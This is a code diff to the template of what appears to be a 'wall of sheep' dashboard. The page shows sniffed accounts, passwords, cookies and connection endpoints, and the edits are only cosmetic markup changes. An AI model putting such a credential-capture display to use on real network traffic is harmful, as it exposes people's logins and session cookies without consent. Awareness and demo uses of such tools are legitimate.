@@ -38,7 +38,8 @@
                 <div class="box">
                     <div class="box-header">
                         <h2 class="text-center"># Can I Get The Pas***ord?</h2>
-                        <small class="text-center">Below are the newest <code><%= lists.length %></code> sheep we just
+                        <small class="text-center">Below are the newest <code
+                                    class="count-num"><%= lists.length %></code> sheep we just
                             catched for
                             dinner now.
                         </small>
@@ -46,7 +47,6 @@
                     <table class="table table-hover b-t">
                         <thead>
                         <tr>
-                            <!--<th>#ID</th>-->
                             <th>Account</th>
                             <th>Password</th>
                             <th class="text-center">Cookie</th>
@@ -61,9 +61,6 @@
                         <% lists.forEach(function(el, index) { %>
                         <% if (el.password || el.cookies) { %>
                         <tr>
-                            <!--<td>-->
-                            <!--<%= index %>-->
-                            <!--</td>-->
                             <td>
                                 <% if (el.login) { %>
                                 <%= (el.login).substr(0, 20) %>
@@ -123,8 +120,9 @@
 
             infoArr.push("<td>" + d.login || "" + "</td>");
             infoArr.push("<td>" + d.password || "" + "</td>");
-            infoArr.push('<td class="cookie" data-container="body" data-toggle="tooltip"\
-            data-placement="top" title="' + cookie + '">' + cookie + '</td>');
+            infoArr.push('<td class="cookie" data-container="body" data-toggle="tooltip" data-placement="top" title="' + cookie + '">'
+                + cookie
+                + '</td>');
             infoArr.push("<td>" + d.sIP + ":" + d.sPort + "</td>");
             infoArr.push("<td>" + d.dIP + ":" + d.dPort + "</td>");
             infoArr.push("<td>" + d.domain + "</td>");
